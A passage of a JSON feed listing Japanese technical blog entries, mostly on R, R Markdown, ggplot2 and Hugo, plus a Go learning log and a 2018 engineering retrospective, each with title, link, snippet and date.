tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGoでAPIを作成してみようと考えています。","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Ghostscript (> 9.15) を使って PDF 中の文字列をアウトライン化する","link":"https://blog.atusy.net/2019/05/23/outline-pdf-glyphs-by-gs/","contentSnippet":"HTML + CSS で作ったポスターをちゃんと印刷したくて調べたメモ．どうやら Ghostscript (> 9.15) で以下のような呪文を唱えればいいようだ．gs -o output.pdf -dNoOutputFonts -sDEVICE=pdfwrite input.pdf手元で試した分にはうまくいってそう (gs 9.27-1)．","isoDate":"2019-05-23T00:00:00.000Z","dateMiliSeconds":1558569600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown でコードブロックに行番号を表示する 〜最終章〜","link":"https://blog.atusy.net/2019/05/19/rmd-line-num-pr/","contentSnippet":"Rmd で様々な HTMLフォーマット に出力した時にコードブロックに行番号を表示する機能 +α を PR したので使い方の紹介と PR の記録，","isoDate":"2019-05-19T00:00:00.000Z","dateMiliSeconds":1558224000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RStudio 1.2.x では install.packages する時にパッケージ名を補完してくれる","link":"https://blog.atusy.net/2019/05/18/auto-complete-when-install-package/","contentSnippet":"リリースノートにも載っていない RStudio 1.2.x の世界ん？install.packagesするとき、ライブラリ名が補完される・・・？？？という @niszet0 氏の 投稿 を発端に確認．なぜか私が纏めることに．上の画像のように，パッケージ名を引用符で囲わずに入力し始め，tab キーを押すと幸せになれる．","isoDate":"2019-05-18T00:00:00.000Z","dateMiliSeconds":1558137600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown + XeLaTeX で日本語含め好きなフォントを使って PDF を出力する","link":"https://blog.atusy.net/2019/05/14/rmd2pdf-any-font/","contentSnippet":"これまでに度々 Rmd で日本語 PDF を出力する系の記事を書いてきました．RMarkdown + XeLaTeX + Noto フォントで日本語 PDF を出力するhttps://blog.atusy.net/2019/04/29/notocjkjp-on-rmd/Rmarkdownで日本語PDFを出力するhttps://qiita.com/Atsushi776/items/9ef1e5d744e2b91c61eej両記事は共に IPA(ex) フォントを使ってきました．","isoDate":"2019-05-14T00:00:00.000Z","dateMiliSeconds":1557792000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"knitr をフォークする時は knitr-examples もフォークした方がいい","link":"https://blog.atusy.net/2019/05/13/forking-knitr/","contentSnippet":"R Markdown のコードブロックで行番号を便利に使えるよう，関連パッケージに働きかけています．bookdown::html_document2 に clean_highlight_tags を追加(#706; merged)pagedown の default.css を編集して出力の見た目を修正(#100; approved)knitr のコードブロックに Pandoc のfenced code attributesをフルサポートさせる(#1710)詳細は全てがマージされたら報告しようかなと．","isoDate":"2019-05-13T00:00:00.000Z","dateMiliSeconds":1557705600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Hugo テーマを更新して UX 向上を狙ってみた","link":"https://blog.atusy.net/2019/05/11/simplified-hugo-bootstrap/","contentSnippet":"当 blog は 静的サイトジェネレータの Hugo によって運用している．テーマは長らく Xzya/hugo-bootstrap だデモサイト)．しかし，目立つ青が随所に散らばるテーマであることなど，イマイチ読み難いように感じていた．","isoDate":"2019-05-11T00:00:00.000Z","dateMiliSeconds":1557532800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Hugo で KaTeX","link":"https://blog.atusy.net/2019/05/09/katex-in-hugo/","contentSnippet":"MathJax より軽量で高速な KaTeX に乗り換えた","isoDate":"2019-05-09T19:00:00.000Z","dateMiliSeconds":1557428400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Hugo (blogdown) で MathJax","link":"https://blog.atusy.net/2019/05/09/how2mathjax/","contentSnippet":"Hugo (blogdown) で MathJax を利用する方法を紹介．ただし，2019-05-09 以降は KaTeX を採用しているため，数式のレンダリングは KaTeX によるもの．","isoDate":"2019-05-09T18:00:00.000Z","dateMiliSeconds":1557424800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RMarkdown + XeLaTeX + Noto フォントで日本語 PDF を出力する","link":"https://blog.atusy.net/2019/04/29/notocjkjp-on-rmd/","contentSnippet":"はじめに過去に 「Rmarkdownで日本語PDFを出力する」という記事を書いた．ここでは以下のような YAML フロントマターを用いて， IPA フォントによる日本語 PDF を出力した．---output: pdf_document:  latex_engine: xelatex header-includes:  - \\\\usepackage{bookmark}  - \\\\usepackage{xltxtra}  - \\\\usepackage{zxjatype}  - \\\\usepackage[ipa]{zxjafont} ---\\\\usepackage[ipa]{zxjafont} という部分で IPA フォントを指定しているが，ここには他のフォントも指定できる1．","isoDate":"2019-04-29T00:00:00.000Z","dateMiliSeconds":1556496000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"rocker/verse でも Rmd → PDF 時に必要なパッケージが自動インストールできるようになった","link":"https://blog.atusy.net/2019/04/27/tlmgr-install-on-rocker/","contentSnippet":"rocker/verse における Tex Live 関連の権限が更新され， tlmgr install や Rmd → PDF 時に必要なパッケージの自動インストールが可能になった．Dockerfile 編集時には注意点あり．","isoDate":"2019-04-27T00:00:00.000Z","dateMiliSeconds":1556323200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"highlightjs と highlightjs-line-numbers プラグインで Rmarkdown のコードブロックに行番号をつける","link":"https://blog.atusy.net/2019/04/22/rmd-line-num-with-highlightjs/","contentSnippet":"highlightjs と highlightjs-line-numbers プラグインによって， 様々な html フォーマットにおいてコードブロックに番号付けできるようにする方法を紹介する．","isoDate":"2019-04-22T00:00:00.000Z","dateMiliSeconds":1555891200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rmarkdown でチャンクとその出力に行番号を付ける","link":"https://blog.atusy.net/2019/04/18/rmd-line-num/","contentSnippet":"html_document と pdf_document でチャンクとその出力に行番号を付ける方法が判ったので，紹介します．出力例と詳解は英語版をご覧下さい．","isoDate":"2019-04-18T00:00:00.000Z","dateMiliSeconds":1555545600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Form","link":"https://blog.atusy.net/netlify-forms/","contentSnippet":"Send","isoDate":"2019-04-17T00:00:00.000Z","dateMiliSeconds":1555459200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"プライバシーポリシー","link":"https://blog.atusy.net/privacy-policy/","contentSnippet":"本文書は，当サイト (Atusy’s blog) における個人情報の保護およびその適切な取り扱いについての方針を示したものです．当サイトが利用しているアクセス解析ツールに関して当サイトでは，Googleによるアクセス解析ツール「Googleアナリティクス」を利用しています．このGoogleアナリティクスはトラフィックデータの収集のためにCookieを使用しています．このトラフィックデータは匿名で収集されており，個人を特定するものではありません．","isoDate":"2019-04-17T00:00:00.000Z","dateMiliSeconds":1555459200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"rocker で使える便利コマンド install2.r とその仲間たち powered by littler","link":"https://blog.atusy.net/2019/04/16/littler-on-rocker/","contentSnippet":"rocker で使える install2.r や installGithub.r は，シェル上から CRAN や GitHub 上の R パッケージをインストールするコマンドです．これらの正体や TIP を纏めました．","isoDate":"2019-04-16T00:00:00.000Z","dateMiliSeconds":1555372800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"xonsh 始めました + xonshrc 弄って oh-my-fish/yimmy inspired な見た目にする","link":"https://blog.atusy.net/2019/04/14/xonsh-debut/","contentSnippet":"Python が動いちゃうシェルこと xonsh を導入しました．早速最低限の設定としてばんくし氏の xonshrc を撮み食いしつつ，Look & Feel を oh-my-fish/theme-yimmy inspired なものにしました．","isoDate":"2019-04-14T00:00:00.000Z","dateMiliSeconds":1555200000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot2 をもっとカンタンに plotly 化する","link":"https://blog.atusy.net/2019/03/22/ggplotly-asif-layer/","contentSnippet":"ggplot(mtcars, aes(wt, mpg)) + geom_point() + gginteractive() といった感じで，ggplot に優しい文法で ggplot を plotly 化できるようにしてみました．gghighlight との組み合わせも便利です．","isoDate":"2019-03-22T00:00:00.000Z","dateMiliSeconds":1553212800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Istioが作るサービスメッシュ~サンプルアプリのデプロイ~","link":"https://qiita.com/tozastation/items/1f3c3f213b42e1689406","contentSnippet":"サンプルアプリ題材: BookInfo アプリケーション※ 事前にIstioをKubernetesにデプロイしておいてください．構成サンプルアプリのデプロイistio-1.0.6 dire…","isoDate":"2019-03-14T05:18:21.000Z","dateMiliSeconds":1552540701000,"authorName":"tozastation","authorId":"tozastation"},{"title":"CNAME ファイルだけで GitHub pages から301リダイレクトする","link":"https://blog.atusy.net/2019/03/11/use-cname-to-redirect-from-gh-pages/","contentSnippet":"GitHub pages を利用していたレポジトリに転送先のドメインを記述したファイルを作成すると user.github.io/repository/* へのアクセスが指定したドメインに転送されるようになります．","isoDate":"2019-03-11T00:00:00.000Z","dateMiliSeconds":1552262400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"git でプレゼン資料を纏めるなら各資料は submodule 化しとくとよさげ","link":"https://blog.atusy.net/2019/02/14/submodulize-presentations/","contentSnippet":"私はプレゼン資料を atusy/presentation に纏めて公開している．プレゼンの機会なんて無制限にあるので色々面倒が生じる気がしてきた．資料ごとに git log を分けたいsubmodule ならできる振り返る気のない資料は適宜 local から消したいディスク容量節約","isoDate":"2019-02-14T00:00:00.000Z","dateMiliSeconds":1550102400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RStudio daily builds な rocker/verse をビルド時間短かめに作る","link":"https://blog.atusy.net/2019/02/12/dockerfile-rocker-verse-daily/","contentSnippet":"※この記事は元々，Rstudio 1.2.x preview版を利用したい人向けの記事でした. 2019-04-08 に Rstudio 1.2.1335 が正式リリースされたので， daily builds を使いたい人向けに改題しました．","isoDate":"2019-02-12T00:00:00.000Z","dateMiliSeconds":1549929600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"hugo_bootstrap のサイドバーにシェアボタンを追加","link":"https://blog.atusy.net/2019/02/08/sns-buttons/","contentSnippet":"やっぱり Share ボタンは欲しいよねということで雑に実装した．","isoDate":"2019-02-08T00:00:00.000Z","dateMiliSeconds":1549584000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"専用パッケージを導入せず GitHub 上の R パッケージをインストールする","link":"https://blog.atusy.net/2019/02/07/stand-alone-remotes-install-github/","contentSnippet":"TL;DRGitHub上の R パッケージのインストールは以下のようにコマンド一発でできる．force = TRUE による強制インストールなどいろいろできる．","isoDate":"2019-02-07T00:00:00.000Z","dateMiliSeconds":1549497600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"pkgdown で作った Webサイトを引越ししたら algolia/docsearch-configs に設定変更を PR しよう","link":"https://blog.atusy.net/2019/01/25/url-change-for-algolia/","contentSnippet":"docsearch を利用すると，pkgdown で作ったページの全文検索機能を簡単に設定できる (https://pkgdown.r-lib.org/articles/pkgdown.html#search)．先日 pkgdown サイトの URL を qntmap.atusy.net に変更したので，algolia も変えなきゃと思って改めて新規申し込みしてしまった．","isoDate":"2019-01-25T00:00:00.000Z","dateMiliSeconds":1548374400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Warnning: newer than the core を放置せずに pacman -Syuu しとこう (Manjaro linux)","link":"https://blog.atusy.net/2019/01/24/pacman-syuu-when-pkg-is-newer-than-core/","contentSnippet":"pacman -Syu でアップグレードした際に，Warnning: newer than the coreといった警告が出ることがあります．特に systemd などシステムに深く関連するパッケージが警告を貼っする時は pacman -Syuu して新しすぎるパッケージをダウングレードしましょう．","isoDate":"2019-01-24T00:00:00.000Z","dateMiliSeconds":1548288000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GitHub pages から Netlify に移行 + 独自ドメイン化","link":"https://blog.atusy.net/2019/01/23/test-netlify/","contentSnippet":"これまで blog を GitHub pages 上で公開してきたが，思い立って独自ドメインで Netlify に移行した．移行のメリットは Yi Hui が語っているけれど，以下に自分にとっての理由と手順の概略を書き留めておく．","isoDate":"2019-01-23T00:00:00.000Z","dateMiliSeconds":1548201600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"べき演算のベンチマーク","link":"https://blog.atusy.net/2019/01/22/power-calc-bench/","contentSnippet":"確認のための準備bench::markbench::press手動ベンチプレス100乗: * の負け90乗: * の勝ち1000乗: 工夫すれば * も勝てるベクトルを長くしてみる @ 90乗: * が勝てるベクトルを短かくしてみる @ 90乗: : * が負ける底をデカくしてみる @ 90乗: * が勝つEnjoyべき演算をするには ^ を使うか * を使えばいいけれど，条件次第ではなんと * が勝つらしいことが分かった．","isoDate":"2019-01-22T00:00:00.000Z","dateMiliSeconds":1548115200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot で scale = free な facet の軸を調整する","link":"https://blog.atusy.net/2019/01/20/control-axes-in-faceted-plots/","contentSnippet":"はじめにfacet の基本的な例パッケージのロードscales 引数を変えた時の様子を比較全 facet 共通で xmin = ymin = 0 にしてみる任意の facet で軸の範囲をコントロールする．Enjoy!前に Tokyo.R で「ggplot2で図を並べる」と題して色々話させてもらいました．時間や難易度の都合で話し切れていない部分も多々あるのですが，今日はその中の1つを補足したいと思います．はじめにggplot2 で facet を使って図を並べる時， scales 引数を指定することでfacet ごとの軸の範囲を可変にできます．軸の範囲は ggplot2 がそれっぽく決めてくれるのですが，特定の facet について自分でコントロールしたい時はどうすればいいでしょうか．","isoDate":"2019-01-20T00:00:00.000Z","dateMiliSeconds":1547942400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot の facet ごとに共通なプロットを盛り込む","link":"https://blog.atusy.net/2019/01/20/share-data-in-facets/","contentSnippet":"はじめにfacet で表示されない部分のデータをグレーでプロットしてみるversicolor と virginica だけで facet してそれぞれの facet に setosa を表示するEnjoy!はじめにfacet を使うと以下のようにグループごとにプロットを分けることができます．しかし，グループ間の比較を行うのがちょっと辛いですね．こんな時，どうすればいいのでしょうか．","isoDate":"2019-01-20T00:00:00.000Z","dateMiliSeconds":1547942400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"base にパイプはないといつ言った？","link":"https://blog.atusy.net/2019/01/19/yet-another-pipe/","contentSnippet":"時はパイプ戦国時代．Tidyverse が覇権を握る世界線において pipe とは magrittr::`%>%` のことでしょうか．私は pipeR::`%>>%` 派ですね．他にも wrapr::`%.>%` など，色々な宗派があります．pipe の成り立ちを探る神学者たちも続々と表れております．","isoDate":"2019-01-19T00:00:00.000Z","dateMiliSeconds":1547856000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"一度に複数の変数を force する","link":"https://blog.atusy.net/2019/01/18/force-many-vars-at-once/","contentSnippet":"結論force(list(a, b, c, ...)) とすればいい．f <- function(a, b, c, ...) { force(list(a, b, c, ...)) # 先に評価したいものから list に入れる 10}f() #> Error in force(list(a, b, c, ...)) : argument \\"a\\" is missing, with no defaultf(stop(\\"a でエラー\\"))#> Error in force(list(a, b, c, ...)) : a でエラーf(a = 1) #> Error in force(list(a, b, c, ...)) : argument \\"b\\" is missing, with no defaultf(a = 1, b = 1)#> Error in force(list(a, b, c, ...)) : argument \\"c\\" is missing, with no defaultf(a = 1, c = 1)#> Error in force(list(a, b, c, ...)) : argument \\"b\\" is missing, with no default# OKf(a = 1, b = 1, c = 1)f(a = 1, b = 1, c = 1, d = 1)背景Rでは関数の引数が遅延評価されるため，引数は使わない限り評価されない“Adv. R: Lazy evaluation”)．force 関数を使う．xforce を使うことで開発者の意図を盛り込もう．","isoDate":"2019-01-18T00:00:00.000Z","dateMiliSeconds":1547769600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"captioner を魔改造してみた","link":"https://blog.atusy.net/2019/01/17/enhance-captioner/","contentSnippet":"はじめに実装captioner を初期化キャプションを振る時は相互参照に利用する名前を id に流用参照する時は相互参照に利用する名前をリンクにする図をテストplot()表をテストknitr::kable()gt::gt()id付け失敗id付け成功例1id付け成功例2gt は相互参照未対応であることを確認はじめにcaptioner を使うと相互参照に未対応な Rmd フォーマットも相互参照できるようになる(rmarkdown::html_document とか pkgdown とか……)．詳しくはテラモナギさんの記事を参照(captionerパッケージで図・表に対する参照(レファレンス)を取得する)．","isoDate":"2019-01-17T00:00:00.000Z","dateMiliSeconds":1547683200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"S3総称関数の引数の既定値はメソッドに渡らない","link":"https://blog.atusy.net/2019/01/16/s3-generics-dont-pass-default-params-to-methods/","contentSnippet":"Error と周辺の挙動f <- function(x, n = 1, ...) UseMethod(\\"f\\")f.default <- function(x, n, ...) nf(NULL)## Error in f.default(NULL): argument \\"n\\" is missing, with no defaultてっきり f(NULL) を実行すると，既定で n = 1 だから，f.default(x = NULL, n = 1) が呼び出されるとばかり思っていた．メソッドに渡される引数は明示的に値を与えたものだけらしい．","isoDate":"2019-01-16T00:00:00.000Z","dateMiliSeconds":1547596800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"group_map などの data frame を要約する関数をベンチマーク (dplyr > 0.8.x)","link":"https://blog.atusy.net/2019/01/04/benchmarks-on-summarizing-with-dplyr/","contentSnippet":"パッケージ読み込みベンチマーク結果表Ridgeline 図箱ひげ図感想と補足Enjoy!tidyverse において，grouped data frame に対して grouping variables以外の各列に関数を適用する方法は種々ある．summarize: 関数の返り値が長さ1の時group_map: 関数の返り値がデータフレームの時nest %>% map: 関数の返り値が複雑な時基本は上述の使い分けのようだが (help(dplyr::group_map))，一応， summarize も返り値を list() してやると複雑な処理に対応できる(後述)．","isoDate":"2019-01-04T00:00:00.000Z","dateMiliSeconds":1546560000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"2018年振り返りと、2019年の目標","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controlle…","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"pacman でパッケージのインストール・ロードを簡単にする","link":"https://blog.atusy.net/2018/12/15/pacman/","contentSnippet":"pacman パッケージとはpacman パッケージの関数インストール / 読み込みを行うものその他便利関数10選needs パッケージとの比較pacman でも needs::prioritize したい？改善案GitHub 上のパッケージも NSE で指定したいCRAN 上のパッケージも GitHub 上のパッケージも同じ関数で指定したいCRAN 上のパッケージも @ でバージョン指定したいGitHub 上のパッケージも一時的な利用をしたい上記を合体させたいpacman パッケージとはR におけるパッケージ管理ツール．1","isoDate":"2018-12-15T00:00:00.000Z","dateMiliSeconds":1544832000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"furrr パッケージで R で簡単並列処理","link":"https://blog.atusy.net/2018/12/06/furrr/","contentSnippet":"インストール読み込み使い方シングルスレッド (strategy = sequential)マルチスレッド (strategy = multiprocess)コア数を変更乱数を固定プログレスバーを表示出力の型furrr パッケージを使うとpurrr パッケージのノリでモダンに並列処理ができるぞ!purrr パッケージを使ったことがない人は下記のリンクを参考して欲しい．","isoDate":"2018-12-06T00:00:00.000Z","dateMiliSeconds":1544054400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"furrr パッケージで ggplot のリストの表示を高速化する","link":"https://blog.atusy.net/2018/12/05/accelerate-list-of-ggplot-with-furrr/","contentSnippet":"はじめに実装とテストベンチマーク感想はじめに前にhoxo-m/pforeach パッケージを利用して，ggplot のリストを並列処理し，描写の高速化を行いました．しかし， hoxo-m/pforeach パッケージの霊圧が消えてしまったので，furrr パッケージを試してみることにしました．","isoDate":"2018-12-05T00:00:00.000Z","dateMiliSeconds":1543968000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"日本語でvimのfを使う","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカ…","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Japan.R 2018 感想","link":"https://blog.atusy.net/2018/12/02/japanr2018-joined/","contentSnippet":"Japan.R 2018 に参加しました発表の感想Long TalkR によるシステム開発入門 by @kos59125R Markdown テンプレートの作り方 by @kazutanGUI で簡単！モダンなデータ解析 by @efprime_jpShiny 完全に理解した by @Med_KULightning Talkgepuro task views 2nd by @gepuro条件付き相互作用の分析 by 太田博三DID 分析の説明 by やぎべゑcontextual パッケージでバンディットアルゴリズムの検証 by @housecat442スポーツチームでの R 活用の可能性 (ラグビーでの例を通して) by Koichi Kinoshita分析屋が福岡に移住して２年経った話 by @doradora09SagemakeR by @hiratake55Rによる分位点処置効果推定の話 by Yusuke Kanekoなんかやる（高速化周りかも） by かんこれアラサーエンジニア シティボーイ化計画 - 都会のお得物件を統計的に探してみる - by @hana_orinRcpp パッケージで外部 C++ ライブラリを使う by @heavywataldigdag で R をバッチり回す by @chengvtR で書く R コンパイラ by @igjit（仮）深層学習か画像認識で何かやります by nakamichi関数魔改造講座 (formals編) by atusyPlayer Rating with R by shrrt量子化学 (フラグメント分子軌道法) でも R したい(薬) 川嶋裕介ぼくの町の不安定 by tanaka_marimoこの IR のグラフがすごい! 上場企業2018 @ito_yanJapan.R 2018 に参加しました今回も多種多様でハイレベルな発表でしたね。個人的には自称 BeginneR 達の躍進が嬉しかったです。短期間に ggplot2 パッケージや leaflet パッケージを使えるようになって LT してくれる、これはコミュニティの情報共有の目醒ましい成果だと思います。","isoDate":"2018-12-02T00:00:00.000Z","dateMiliSeconds":1543708800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"viridisの色数","link":"https://blog.atusy.net/2018/11/25/size-of-viridis-color-palette/","contentSnippet":"viridis や cividis は、色の変化が知覚的に一様となるよう調整された、連続的なカラースケール。白黒印刷するとグレースケールになるので、プリンタにも優しい。viridis は論文がなさそうだが、 cividis は論文にもなっているようだ (https://arxiv.org/ftp/arxiv/papers/1712/1712.01662.pdf)。","isoDate":"2018-11-25T00:00:00.000Z","dateMiliSeconds":1543104000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"書評 「R MarkdownでWord文書を作ろう」","link":"https://blog.atusy.net/2018/11/25/rmd-de-word/","contentSnippet":"RmdでWord本の再販が間近に迫っていますね．これは献本頂いた時にしたレビューの約束を果たす時!!Rmdでこんなに完成したWordドキュメントを作れるんだ……! と感動できるので是非．","isoDate":"2018-11-25T00:00:00.000Z","dateMiliSeconds":1543104000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"`ggplot2::coord_cartesian(xlim = c(0, NA))` できるようにしてみた","link":"https://blog.atusy.net/2018/11/22/strange-coord-functions-ggplot2/","contentSnippet":"問題実装オリジナル修正版実験他のcoord_系列も問題なさそう感想PRに向けての試験的な実装．https://github.com/atusy/ggplot2/commit/26c1b7a478585889947d265d691e375e399637c3なぜかxlimやylimに長さ3以上の連続値を取れてしまうので，本来はscale_*_continuousやxlimに合わせて長さ2までに制限すべきだと思う","isoDate":"2018-11-22T00:00:00.000Z","dateMiliSeconds":1542844800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"CSSでヘッダの行間を調整してみた","link":"https://blog.atusy.net/2018/11/21/mod-css-margin/","contentSnippet":"h1からh2そしてh3までの余白が以前はこんな感じで辛かった h2  h3  h2  h3 余白であって、行間ではないので、長い見出しを書いても大丈夫ですやりかたhugoを使っているので、テーマが保存されているディレクトリの","isoDate":"2018-11-21T00:00:00.000Z","dateMiliSeconds":1542758400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shinyでggplot2の選択領域を拡大 (brushOpts)","link":"https://blog.atusy.net/2018/11/21/shiny-brushopts/","contentSnippet":"Shinyでplotly.jsを使わずにインタラクティブな図を作れるのかなと思ったら、「Shiny 100本ノック」の【Shiny小技】グラフをダブルクリックすると情報が取得できる、dblclickOptsの紹介を見つけました。どうやら、 brushOpts なるものを使えば、 plot (ggplot2 を含む)の拡大ができるようなので試してみました。","isoDate":"2018-11-21T00:00:00.000Z","dateMiliSeconds":1542758400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ヒストグラムのビンの色をx軸に応じて変える","link":"https://blog.atusy.net/2018/11/20/histogram-fill-along-x/","contentSnippet":"ヒストグラムをヒートマップの凡例 + αにしたい試行錯誤の歴史データ整形ヒストグラムfill = x ではダメfill = stat(x) ならOKソース追記tl; drgeom_histogram(aes(fill = stat(x))) すればいい。ヒストグラムをヒートマップの凡例 + αにしたいから、ヒストグラムのビンの色をx軸に応じて変えたいと思った。","isoDate":"2018-11-20T00:00:00.000Z","dateMiliSeconds":1542672000000,"authorName":"Atsushi 